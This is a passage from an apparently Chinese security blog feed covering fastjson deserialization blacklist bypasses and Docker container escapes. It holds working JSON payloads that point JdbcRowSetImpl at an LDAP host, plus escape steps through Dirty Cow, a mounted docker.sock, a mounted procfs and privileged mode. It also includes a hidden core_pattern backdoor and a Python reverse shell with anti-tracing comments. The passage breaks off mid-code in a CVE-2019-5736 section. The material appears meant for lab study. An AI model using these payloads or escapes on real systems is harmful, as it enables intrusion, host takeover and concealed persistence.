class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>    String deny = denyList[i];<br>    <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/20190724201853.png"></p><p>同时还关闭反序列化任意类<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype">Autotype</a></p><p>黑名单的绕过：</p><p><code>TypeUtils.loadClass</code>真正加载class类时，有这样一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>    <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>&#125;<br><br><span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<br>    String newClassName = className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到在黑名单检测之后，当开头有<code>[</code>或者<code>L</code>和<code>;</code>时会去掉这些字符，从而造成了黑名单的绕过</p><p>绕过方式：在包名前加<code>L</code>，包名后加<code>;</code></p><blockquote><p>{“@type”:”<strong>L</strong>com.sun.rowset.JdbcRowSetImpl**;**”,”dataSourceName”:”ldap://vps/Touchfile”,”autoCommit”:true}</p></blockquote><h3 id="1-2-42-开启Autotype"><a href="#1-2-42-开启Autotype" class="headerlink" title="1.2.42(开启Autotype)"></a>1.2.42(开启Autotype)</h3><p>1.2.42修复：假如开头和结尾是<code>L</code>和<code>;</code>就将头和尾去掉，再进行黑名单验证，然后将黑名单加密，不让你们搞了，嘿嘿</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323014010926.png"></p><p><a href="https://github.com/LeadroyaL/fastjson-blacklist">blacklist-fuzz</a></p><p>双写绕过：</p><blockquote><p><strong>LL</strong>com.sun.rowset.JdbcRowSetImpl**;;**</p></blockquote><h3 id="1-2-43-开启Autotype"><a href="#1-2-43-开启Autotype" class="headerlink" title="1.2.43(开启Autotype)"></a>1.2.43(开启Autotype)</h3><p>开头两个<code>LL</code>抛出异常，迭代就是不断更新黑名单</p><h3 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h3><p>无需开启<code>autotype</code>通杀1.2.48以下所有，有传言在autotype开启的情况下可以打到1.2.57：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;a&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>, <br>        <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;, <br>    <span class="hljs-attr">&quot;b&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, <br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>断点如下：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324140337580.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324140352482.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324140824351.png"></p><p>解析到字段a，步进</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324151509785.png"></p><p>在checkAutoType方法<code>TypeUtils.getClassFromMapping(typeName)</code>以及<code>deserializers.findClass(typeName)</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324160340283.png"></p><p>第一个方法，返回<code>(Class)mappings.get(className)</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324152509308.png"></p><p><code>deserializers.findClass(typeName)</code>在getName获得类名，然后与传入的相比较并返回</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324152757662.png"></p><p>然后还没到<code>autoTypeSupport</code>就return clazz了</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324161558201.png"></p><p>调用的反序列化类</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324162612574.png"></p><p>MiscCodec来到304<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324164412464.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324164450203.png"></p><p>接着就是第二段的<code>checkAutoType</code>，从mappings拿到<code>com.sun.rowset.JdbcRowSetImpl</code>，同样还没到<code>autoTypeSupport</code>验证拿到的<code>com.sun.rowset.JdbcRowSetImpl</code>就return clazz</p><p>修复将<code>loadClass</code>中的cache设置为false，在第一次获取到<code>com.sun.rowset.JdbcRowSetImpl</code>这个类之后就不会缓存，到第二次的payload时也就取不到缓存的类，也就会进入到黑名单和<code>com.sun.rowset.JdbcRowSetImpl</code>的验证中。</p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初探Docker容器逃逸</title>
    <link href="/2022/04/11/%E5%88%9D%E6%8E%A2Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    <url>/2022/04/11/%E5%88%9D%E6%8E%A2Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="初探Docker容器逃逸"><a href="#初探Docker容器逃逸" class="headerlink" title="初探Docker容器逃逸"></a>初探Docker容器逃逸</h1><h2 id="判断是否处于Container中"><a href="#判断是否处于Container中" class="headerlink" title="判断是否处于Container中"></a>判断是否处于Container中</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">/.dockerenv文件<br><span class="hljs-regexp">/proc/</span><span class="hljs-number">1</span>/cgroup文件是否存在<span class="hljs-string">&quot;docker&quot;</span>字符串<br>是否有container环境变量<br></code></pre></td></tr></table></figure><h2 id="Container逃逸"><a href="#Container逃逸" class="headerlink" title="Container逃逸"></a>Container逃逸</h2><h3 id="与容器共享存在漏洞的内核"><a href="#与容器共享存在漏洞的内核" class="headerlink" title="与容器共享存在漏洞的内核"></a>与容器共享存在漏洞的内核</h3><p>Dirty  Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。</p><p>VDSO就是Virtual Dynamic Shared  Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。</p><p>内核版本低于如下版本，则存在脏牛漏洞。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Centos7</span> /RHEL<span class="hljs-number">7</span>  <span class="hljs-number">3</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>-<span class="hljs-number">327</span>.<span class="hljs-number">36</span>.<span class="hljs-number">3</span>.el<span class="hljs-number">7</span><br><span class="hljs-attribute">Cetnos6</span>/RHEL<span class="hljs-number">6</span>   <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">32</span>-<span class="hljs-number">642</span>.<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.el<span class="hljs-number">6</span><br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">16</span>.<span class="hljs-number">10</span>    <span class="hljs-number">4</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">26</span>.<span class="hljs-number">28</span><br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">16</span>.<span class="hljs-number">04</span>    <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">45</span>.<span class="hljs-number">66</span><br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">14</span>.<span class="hljs-number">04</span>    <span class="hljs-number">3</span>.<span class="hljs-number">13</span>.<span class="hljs-number">0</span>-<span class="hljs-number">100</span>.<span class="hljs-number">147</span><br><span class="hljs-attribute">Debian</span> <span class="hljs-number">8</span>        <span class="hljs-number">3</span>.<span class="hljs-number">16</span>.<span class="hljs-number">36</span>-<span class="hljs-number">1</span>+deb<span class="hljs-number">8</span>u<span class="hljs-number">2</span><br><span class="hljs-attribute">Debian</span> <span class="hljs-number">7</span>        <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">82</span>-<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><strong>环境：</strong></p><p>宿主机：<a href="http://old-releases.ubuntu.com/releases/14.04.0/ubuntu-14.04.5-server-amd64.iso">Ubuntu 14.04.5</a></p><p>容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/gebl/dirtycow-docker-vdso.git<br><span class="hljs-built_in">cd</span> dirtycow-docker-vdso/<br>docker-compose run dirtycow /bin/bash<br><br><span class="hljs-built_in">cd</span> /dirtycow-vdso/<br>make<br>./0xdeadbeef 1.1.1.1:2333 // 反弹shell<br></code></pre></td></tr></table></figure><h3 id="不安全挂载"><a href="#不安全挂载" class="headerlink" title="不安全挂载"></a>不安全挂载</h3><h4 id="挂载docker-sock"><a href="#挂载docker-sock" class="headerlink" title="挂载docker.sock"></a>挂载docker.sock</h4><p><strong><a href="https://blog.csdn.net/boling_cavalry/article/details/92846483">前置知识</a>：</strong></p><p>首先，我们使用过docker的都知道</p><blockquote><p>docker ps  //列出Up容器</p><p>docker images //列出所有的镜像</p></blockquote><p>就这样的命令，牵扯到docker的C/S架构：三个组件(client，daemon，registry)，两个概念(image和container)</p><p>Docker的C/S架构，通信方式有以下3种：</p><ul><li>unix:///var/run/docker.sock(默认)</li><li>tcp://host:port</li><li>fd://socketfd</li></ul><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fseo-1255598498.file.myqcloud.com%2Ffull%2F66ec0965a96e9a6d2d1c191ebcc8807ba71baa93.jpg&refer=http%3A%2F%2Fseo-1255598498.file.myqcloud.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113819&t=6abc442e6df87436f6b850b78b48ceda"></p><p>我们熟知的Docker命令就是Client；Docker Daemon是Docker架构中一个常驻在后台的系统进程，该守护进程在后台启动了一个Server，该Server负责接受Docker Client发送的请求；并通过路由与分发调度找到相应的Handler来执行请求。</p><p>在Linux系统中，Docker Daemon启动使用的可执行文件也是docker，与Docker Client启动所使用的可执行文件docker相同。在docker命令执行时，通过传入的参数来判别Docker Daemon与Docker Client。</p><p><a href="https://yanbin.blog/replace-docker-desktop-with-hyperkit-minikube/">Docker Desktop收费的那些事</a></p><p>我们更熟悉的CLI模式是怎么工作的呢？</p><p><a href="https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option">Daemon</a></p><p><a href="https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd">/var/run/docker.sock</a></p><p>那么刚刚两条命令就可以等价于</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json<br>curl -s --unix-socket /var/run/docker.sock http://localhost/images/json<br></code></pre></td></tr></table></figure><p>现在我们就完全明白Docker也是基于C/S架构，其中Daemon会监听/var/run/docker.sock这个文件，我们向这个文件发送合适的请求，可以达到docker命令在终端同样的操作</p><p><a href="https://docs.docker.com/engine/api/">各个版本的API接口</a>：<a href="https://docs.docker.com/engine/api/v1.41/#operation/ContainerList">https://docs.docker.com/engine/api/v1.41/#operation/ContainerList</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220408225310174.png"></p><p><strong>环境搭建：</strong></p><blockquote><p>docker pull rocm/dev-ubuntu-18.04  //随便找一个镜像</p><p>docker run -id -v /var/run/docker.sock:/var/run/docker.sock edb  //创建一个挂载了/var/run/docker.sock的容器</p><p>docker exec -it 517 /bin/bash  //进入容器内部</p></blockquote><p>至此，我们已经在实战的一个环境下了</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409212210034.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409212246397.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409212414544.png"></p><p><strong>攻击步骤：</strong></p><ol><li>在该容器环境下，安装docker</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL get.docker.com -o get-docker.sh  //官方脚本安装<br>sh get-docker.sh --mirror Aliyun<br></code></pre></td></tr></table></figure><p>安装完docker，因为挂载了/var/run/docker.sock，通过docker命令，我们发现可以列出宿主机的所有docker容器和镜像</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409214204019.png"></p><ol start="2"><li>通过挂载，创建一个新的容器，并挂载宿主机的根目录</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -v /:/a edb /bin/bash  //-id需要<span class="hljs-built_in">exec</span>进入容器<br></code></pre></td></tr></table></figure><ol start="3"><li>在新的容器，更换根目录到挂载的宿主机的根目录</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">chroot /a<br><span class="hljs-comment"># /bin/bash</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409215346242.png"></p><p>至此，基本从容器逃逸出来了</p><h4 id="挂载procfs"><a href="#挂载procfs" class="headerlink" title="挂载procfs"></a>挂载procfs</h4><p>进一步地，我们ps查看进程发现，“逃逸出来的容器“的进程还是容器内的，因为没有挂载procfs</p><blockquote><p>man proc  //查看文档</p></blockquote><p>或者<a href="https://man7.org/linux/man-pages/man5/proc.5.html">Online Manual Pages</a></p><p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是没有开启<code>User Namespace</code>时并且在该容器内默认启用root权限</p><p>procfs中的<code>/proc/sys/kernel/core_pattern</code>负责配置进程崩溃时内存转储数据的导出方式</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409231445112.png"></p><blockquote><p>基于<a href="https://xz.aliyun.com/t/1098">core_pattern用来隐藏系统后门</a>这篇文章，实验如下：</p><ul><li><strong>环境搭建：</strong>创建一个挂载了宿主机/proc目录的容器</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -v /proc:/a/proc edb /bin/bash<br></code></pre></td></tr></table></figure><ul><li><strong>攻击步骤：</strong>在容器内(相当于实战环境下)</li></ul><p>\rcore是写入文件掩盖后门的作用，<code>\r将光标移动至行首，但不换行</code>，cat会遮盖<code>|</code>，vim可以看到端倪</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|/tmp/.conn.py \rcore    &quot;</span> &gt;  /proc/sys/kernel/core_pattern<br></code></pre></td></tr></table></figure><p>然后准备脚本/tmp/.conn.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span>  os<br><span class="hljs-keyword">import</span> pty<br><span class="hljs-keyword">import</span> socket<br>Rhost = <span class="hljs-string">&quot;ip&quot;</span><br>Rport = port<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>   s.connect((Rhost, Rport))<br>   os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>   os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>   os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>   os.putenv(<span class="hljs-string">&quot;HISTFILE&quot;</span>, <span class="hljs-string">&#x27;/dev/null&#x27;</span>)<br>   pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br>   <span class="hljs-comment"># os.remove(&#x27;/tmp/.conn.py&#x27;) //实战中防溯源，进一步还可以再恢复/删除掉core_pattern这个文件</span><br>   s.close()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>   main()<br></code></pre></td></tr></table></figure><p>因为是脚本运行，需要加执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod +x .conny.py<br></code></pre></td></tr></table></figure><p>准备一个可以引起崩溃的c代码</p><p>crash.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> *a = <span class="hljs-literal">NULL</span>;<br>*a = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc crash.c -o crash<br></code></pre></td></tr></table></figure><p>服务器监听，运行crash反弹shell</p></blockquote><p>细心的朋友注意到，原文实验并非基于docker逃逸的，那么我们能否直接写入<code>core_pattern</code>文件进行docker逃逸呢</p><p>注意到写入的<code>/proc/sys/kernel/core_pattern</code>文件是在宿主机的，而<code>/tmp/.conn.py</code>是在容器内的</p><p>所以我们需要获得<code>/tmp/.conn.py</code>在宿主机的绝对路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /proc/mounts | grep docker<br></code></pre></td></tr></table></figure><p>其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">workdir=/var/lib/docker/overlay2/17759ecee79fc4ddd2450e20beffc4a2d2e0c785be630d1055bc7e1329660056/work<br></code></pre></td></tr></table></figure><p>那么我们可知，其绝对路径为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/docker/</span>overlay2<span class="hljs-regexp">/17759ecee79fc4ddd2450e20beffc4a2d2e0c785be630d1055bc7e1329660056/</span>diff<br></code></pre></td></tr></table></figure><p>因此命令改写为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|/var/lib/docker/overlay2/17759ecee79fc4ddd2450e20beffc4a2d2e0c785be630d1055bc7e1329660056/merged/tmp/.conn.py \rcore    &quot;</span> &gt;  /a/proc/sys/kernel/core_pattern<br></code></pre></td></tr></table></figure><p>其他步骤不变即可反弹shell</p><p>进一步优化步骤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">real_path=`sed -n <span class="hljs-string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|real_path/tmp/.conn.py \rcore    &quot;</span> &gt;  /proc/sys/kernel/core_pattern<br></code></pre></td></tr></table></figure><h3 id="不安全配置"><a href="#不安全配置" class="headerlink" title="不安全配置"></a>不安全配置</h3><h4 id="docker-remote-api"><a href="#docker-remote-api" class="headerlink" title="docker remote api"></a>docker remote api</h4><p><strong>检测方式：</strong></p><blockquote><p>直接访问 ip:2375/version ip:2375/containers/json等</p><p>docker -H tcp://ip:2375 ps #返回了容器列表则漏洞存在</p></blockquote><p><strong>利用方式：</strong></p><p>可以参考不安全挂载，反弹shell(逃逸出来后写计划任务反弹shell、写ssh公钥)</p><p>利用脚本：<a href="https://github.com/Tycx2ry/docker_api_vul">https://github.com/Tycx2ry/docker_api_vul</a></p><h4 id="privilege容器逃逸"><a href="#privilege容器逃逸" class="headerlink" title="privilege容器逃逸"></a>privilege容器逃逸</h4><p>当操作者执行<code>docker run --privileged</code>时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限</p><p><strong>特权容器判断：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /proc/1/status | grep Cap<br></code></pre></td></tr></table></figure><p>存在值<code>0000003fffffffff</code>即为特权容器</p><blockquote><p>–privileged所指的特权容器并不等于Capabilities加满，事实上，前者是包含后者的。具体来说，–privileged至少包含以下能力：</p><ol><li>Capabilities加满</li><li>禁用Seccomp和AppArmor等安全机制</li><li>能够“看到”很多敏感的dev设备</li></ol><p>linux的Capabilities机制<br><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a><br>它对用户的权限进行了更细致的分类，可以对单个线程进行更精度的权限控制。避免粗暴的root特权用户和常规用户的简单区分。当一个进程要进行某个特权操作时,操作系统会检查cap_effective的对应位是否有效,而不再是检查进程的有效UID是否为0。</p><p>一个线程拥有五个Capabilities集合<code>Permitted</code>、<code>Inheritable</code>、<code>Effective</code>、<code>Bounding</code>和<code>Ambient</code><br>分别对应了<code>/proc/self/status</code>中的<code>CapPrm</code>、<code>CapInh</code>、<code>CapEff</code>、<code>CapBnd</code>和<code>CapAmb</code><br><code>Effective</code>集合就是主要的当前线程特权操作权限（Capabilities）的集合。</p></blockquote><p><strong>环境：</strong></p><p>以特权模式启动的容器，<code>fdisk -l</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220410221555377.png"></p><p>现在相当于完成了<strong>挂载docker.sock</strong>中的第二步，启动了一个挂载了根目录的容器</p><p><strong>攻击步骤：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir /a<br>mount /dev/vda1 /a<br>chroot /a<br><span class="hljs-comment"># /bin/bash</span><br></code></pre></td></tr></table></figure><p>逃逸完成</p><h2 id="CVE-2019-5736"><a href="#CVE-2019-5736" class="headerlink" title="CVE-2019-5736"></a>CVE-2019-5736</h2><p><a href="https://cloud.tencent.com/developer/article/1552332">https://cloud.tencent.com/developer/article/1552332</a></p><p>在docker的组件中，runc是一个标准的OCI容器运行时的实现，它是一个命令行工具，通过调用Namespace、Cgroup等系统接口，负责真正意义上创建和启动容器。换句话说，docker客户端就是通过调用runc来创建销毁机器的。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"># yanq @ yanq-desk in ~ [16:28:01] <br>$ docker info | grep &quot;runc&quot;                    <br><span class="hljs-code"> Runtimes: runc</span><br><span class="hljs-code"> Default Runtime: runc</span><br><span class="hljs-code"> runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd</span><br><span class="hljs-symbol">WARNING: </span>No swap limit support<br></code></pre></td></tr></table></figure><p><strong>影响版本：</strong></p><ul><li>Docker Version &lt; 18.09.2</li><li>runC Version &lt;= 1.0-rc6</li></ul><p><strong>漏洞原理：</strong></p><p>漏洞总结下来就是一句话，攻击者可以重写宿主机上的runc二进制文件。</p><p>先来看<code>/proc/self/exe</code>是什么？</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ <span class="hljs-keyword">file</span> <span class="hljs-regexp">/proc/</span>self/exe<br><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/exe: symbolic link to /u</span>sr<span class="hljs-regexp">/bin/</span><span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><p>proc/self/exe符号链接会指向调用者自身，同理proc/pid/exe会指向pid进程的调用者。但是/proc/pid/exe和一般符号链接不同，其不遵循符号链接的正常语义，当进程打开/proc/pid/exe时，没有正常的读取和跟踪符号链接内容的过程。相反，内核只是让用户直接访问打开的文件条目。</p><p>漏洞产生的原因就是宿主机通过runc对docker容器进行操作的时候没有做好访问限制，导致runc可以通过/proc/self/exe符号链接来访问到宿主机上的runc文件。攻击者可以让runc运行/proc/self/exe符号链接来欺骗它自己执行自己，从而对宿主机上的runc文件进行覆盖重写。</p><p>具体的利用步骤：</p><ol><li>容器内生成一个恶意文件，将文件的调用者改为proc/self/exe</li><li>宿主机docker exec调用该恶意文件，会调用proc/self/exe，也就是runc，此时容器内便可以遍历proc进程号，获取runc的进程号</li><li>得到容器进称号PID后，可以获取/proc/pid/exe文件描述符fd</li><li>对fd进行写操作，覆盖原有runc的文件</li></ol><p>问题1：攻击者为什么不继续写入恶意文件从而覆盖主机上的runc二进制文件？</p><p>因为内核将不允许在执行runC时将其覆盖。于是可以通过获取/proc/PID/exe的file handler 来获取runcinit的文件描述符。 然后再写入该文件。</p><p>问题2：runc创建容器时,会首先创建新进程runc-init，并且runc-init在另一个namespace里面，用来做隔离，那么为什么不覆盖runc的子进程runC init？</p><p>CVE-2016-9962漏洞修补程序在进入容器之前就将runC init进程设置为“不可转储”（Non-dumpable）。其漏洞原理是runC init进程拥有来自宿主机的打开文件描述符，容器中的攻击者可以利用它来遍历主机的文件系统，从而打开容器。</p><p><strong>漏洞复现：</strong></p><p>首先安装带有漏洞版本的docker，我直接使用的是ubuntu16，版本为18.06.1-ce。</p><p>如果你没有安装docker或者docker版本没有漏洞,则需要重新安装docker的漏洞版本,步骤如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs 